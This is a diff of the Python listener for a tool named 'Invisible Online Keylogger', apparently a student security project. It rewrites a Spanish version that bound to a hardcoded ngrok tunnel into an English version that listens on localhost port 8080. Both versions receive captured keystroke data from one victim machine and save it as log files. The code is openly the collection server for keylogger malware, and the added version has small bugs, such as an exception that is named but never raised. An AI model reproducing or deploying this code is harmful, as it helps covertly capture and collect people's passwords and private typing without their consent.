@@ -2,84 +2,65 @@ import socket
 import art
 from colorama import Fore
 
-# Función para obtener la dirección y el puerto de Ngrok
-def get_ngrok_address():
-    # Modificar la dirección y el puerto según el túnel Ngrok
-    host = '0d6e-201-123-90-187.ngrok-free.app'
-    port = 7272
-    return host, port
-
-# Artístico
+#All used Functions (3)
+#Artistic Information
 artpost = art.text2art("Invisible Online Keylogger")
-
-# Información
 def info():
-    print(Fore.RED, ' Creado por:  ---> Basil Abdulrahman')
-    print(Fore.LIGHTBLACK_EX, 'Version 1.0')
+    print(Fore.RED,' Created By:  ---> Basil Abdulrahman')
+    print(Fore.LIGHTBLACK_EX,'Version 1.0')
     print(Fore.GREEN)
-
-# Función para nombrar manualmente los archivos de registro
-def manName(conn):
+#Manually Name Incoming Log Files and Save Them in the Log Folder.
+def manName():
     while True:
-        filename = input('Elija un nombre para el archivo entrante\n')
-        filename = '/var/log/' + filename + '.txt'  # Cambiar la ruta según tu entorno
-        file = open(filename, 'wb')
-        data = conn.recv(10000000)
+        filename=input('pick a name for the incoming file\n')
+        filename='C:\\Users\HP\PycharmProjects\CYS403Project\Logs\\'+filename+'.txt'
+        file = open(filename,'wb')
+        data=conn.recv(10000000)
         file.write(data)
         file.close()
-        print(Fore.GREEN, '\nArchivo de registro creado con éxito.')
-
-# Función para nombrar automáticamente los archivos de registro
-def autoName(conn):
-    for i in range(1, 50):
-        filename = '/var/log/' + f'log{i}.txt'  # Cambiar la ruta según tu entorno
+        print(Fore.GREEN,'\nLog File Created Successfully.')
+#Automatically Name Incoming Log Files (as log#) and Save Them in the Log Folder.
+def autoName():
+    for i in range(1,50):
+        filename = 'C:\\Users\HP\PycharmProjects\CYS403Project\Logs\\'+f'log{i}.txt'
         file = open(filename, 'wb')
         data = conn.recv(16777216)
         file.write(data)
         file.close()
-        print(Fore.GREEN, '\nArchivo de registro creado con éxito.')
-
-# Título
-print(Fore.GREEN + artpost)
-
-# Información
+        print(Fore.GREEN,'\nLog File Created Successfully.')
+#Call Title
+print(Fore.GREEN +artpost)
+#Call Info
 info()
 
-# TCP Server utilizando Sockets, esperando conexiones de solo un cliente.
-repeat = True
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-hostname = socket.gethostname()
-print(Fore.CYAN, f'Nombre del host: {hostname}')
+#Use Light Blue Font for the rest of the program.
+print(Fore.LIGHTBLUE_EX)
+#TCP Sever using Sockets, that waits for connections from only one client.
+repeat= True
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+port=8080
+hostname=socket.gethostname()
+host='127.0.0.1'
+print(Fore.CYAN,f'Host name: {hostname}')
+s.bind((host,port))
+s.listen(1)
+print('Waiting for Connections...')
+conn , addr = s.accept()
+print(Fore.LIGHTRED_EX,addr,'Has Connected to the server')
 
-# Intentar conectarse a la dirección de Ngrok
-try:
-    ngrok_address = get_ngrok_address()
-    s.bind(ngrok_address)
-    print('Esperando conexiones...')
-    s.listen(1)
-    conn, addr = s.accept()
-    print(Fore.LIGHTRED_EX, addr, 'se ha conectado al servidor')
-except Exception as e:
-    print(Fore.RED, "Error al conectar con Ngrok:", e)
-    print(Fore.YELLOW, "Intentando conectar al localhost en el puerto 8080")
-    s.bind(('localhost', 8080))  # Intentar conectar a localhost en un puerto específico
-    s.listen(1)
-    conn, addr = s.accept()
-    print(Fore.LIGHTRED_EX, addr, 'se ha conectado al servidor')
-
-# Después de inicializar la conexión, elige nombrar los archivos de registro manual o automáticamente, con manejo de errores
-print(Fore.YELLOW, "¿Deseas nombrar los archivos manualmente o automáticamente?\n1- Nombramiento automático\n2- Nombramiento manual")
+#After initializing the connection, pick to manually or automatically name the log files *with error handling
+print(Fore.YELLOW,"Do you want to name the files manually or do you want them named automatically\n1- Automatic Naming\n2- Manual Naming")
 while repeat:
     try:
-        nc = input('Ingresa 1 o 2:\n')
-        if nc == '1':
+        nc=input('input 1 or 2:\n')
+        if nc=='1':
             repeat = False
-            autoName(conn)
-        elif nc == '2':
+            autoName()
+        elif nc=='2':
             repeat = False
-            manName(conn)
+            manName()
         else:
-            raise Exception
+            Exception
     except:
-        print('¡Solo se permiten 1 o 2!')
+        print('Only 1 or 2 are permitted!')
         continue
